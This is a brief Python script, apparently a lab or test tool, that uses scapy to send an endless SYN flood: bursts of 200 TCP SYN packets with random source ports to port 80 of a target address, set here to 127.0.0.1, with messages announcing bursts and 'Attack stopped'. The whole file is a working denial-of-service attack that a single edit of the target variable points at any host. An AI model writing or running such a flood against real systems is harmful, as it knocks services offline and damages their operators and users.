from scapy.all import IP, TCP, send
import random
import time

target_ip = "127.0.0.1"

print("[*] Continuous SYN traffic started...")

try:

    while True:

        packets = []

        for i in range(200):

            packet = IP(dst=target_ip) / TCP(
                sport=random.randint(1024, 65535),
                dport=80,
                flags="S"
            )

            packets.append(packet)

        send(packets, verbose=False)

        print("[+] Burst sent")

        time.sleep(0.2)

except KeyboardInterrupt:

    print("\n[!] Attack stopped")